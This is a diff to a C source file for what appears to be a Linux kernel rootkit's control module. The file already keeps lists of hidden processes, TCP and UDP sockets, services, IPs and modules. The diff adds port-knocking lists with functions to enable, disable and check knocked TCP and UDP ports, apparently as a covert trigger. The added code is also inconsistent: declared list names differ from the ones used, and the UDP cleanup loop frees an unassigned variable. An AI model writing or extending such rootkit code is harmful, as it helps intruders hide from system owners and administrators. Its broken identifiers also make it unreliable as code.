@@ -12,6 +12,8 @@ static struct list_head prefixes;
 static struct list_head processes;
 static struct list_head tcp_sockets;
 static struct list_head udp_sockets;
+static struct list_head knocking_tcp_ports;
+static struct list_head knocking_udp_ports;
 static struct list_head hidden_services;
 static struct list_head hidden_ips;
 static struct list_head modules;
@@ -303,6 +305,116 @@ unhide_udp_socket(int port)
 	struct list_head *cursor, *next;
 	list_for_each_safe(cursor, next, &udp_sockets) {
 		cur = list_entry(cursor, struct udp_socket, list);
+		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	
+	return -EINVAL;
+}
+
+int
+is_knocked_tcp(int port)
+{
+	struct tcp_knocking_port *cur;
+	struct list_head *cursor;
+	
+	list_for_each(cursor, &tcp_knocking_ports) {
+		cur = list_entry(cursor, struct tcp_knocking_port, list);
+		if(cur->port == port) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+int
+enable_knocking_tcp(int port) 
+{
+	struct tcp_knocking_port *new;
+	
+	if(is_knocked_tcp(port)) {
+		return -EINVAL;
+	}
+
+	new = kmalloc(sizeof(struct tcp_knocking_port), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+
+	list_add(&new->list, &tcp_knocking_ports);
+	
+	return 0;
+}
+
+int
+disable_knocking_tcp(int port)
+{
+	struct tcp_knocking_port *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &tcp_knocking_ports) {
+		cur = list_entry(cursor, struct tcp_knocking_port, list);
+		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	
+	return -EINVAL;
+}
+
+int
+is_knocked_udp(int port)
+{
+	struct udp_knocking_port *cur;
+	struct list_head *cursor;
+	
+	list_for_each(cursor, &udp_knocking_ports) {
+		cur = list_entry(cursor, struct udp_knocking_port, list);
+		if(cur->port == port) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+int
+enable_knocking_udp(int port) 
+{
+	struct udp_knocking_port *new;
+	
+	if(is_knocked_udp(port)) {
+		return -EINVAL;
+	}
+
+	new = kmalloc(sizeof(struct udp_knocking_port), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+
+	list_add(&new->list, &udp_knocking_ports);
+	
+	return 0;
+}
+
+int
+disable_knocking_udp(int port)
+{
+	struct udp_knocking_port *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &udp_knocking_ports) {
+		cur = list_entry(cursor, struct udp_knocking_port, list);
 		if(cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
@@ -630,6 +742,8 @@ initialize_control(void)
 	INIT_LIST_HEAD(&processes);
 	INIT_LIST_HEAD(&tcp_sockets);
 	INIT_LIST_HEAD(&udp_sockets);
+	INIT_LIST_HEAD(&knocking_tcp_ports);
+	INIT_LIST_HEAD(&knocking_udp_ports);
 	INIT_LIST_HEAD(&hidden_services);
 	INIT_LIST_HEAD(&hidden_ips);
 	INIT_LIST_HEAD(&modules);
@@ -689,6 +803,20 @@ cleanup_control(void)
 		udp = list_entry(cursor, struct udp_socket, list);
 		list_del(cursor);
 		kfree(udp);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &tcp_knocking_ports) {
+		tcp_knock = list_entry(cursor, struct tcp_knocking_port, list);
+		list_del(cursor);
+		kfree(tcp_knock);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &udp_knocking_ports) {
+		tcp_knock = list_entry(cursor, struct udp_knocking_port, list);
+		list_del(cursor);
+		kfree(udp_knock);
 	}
 	
 	cursor = next = NULL;
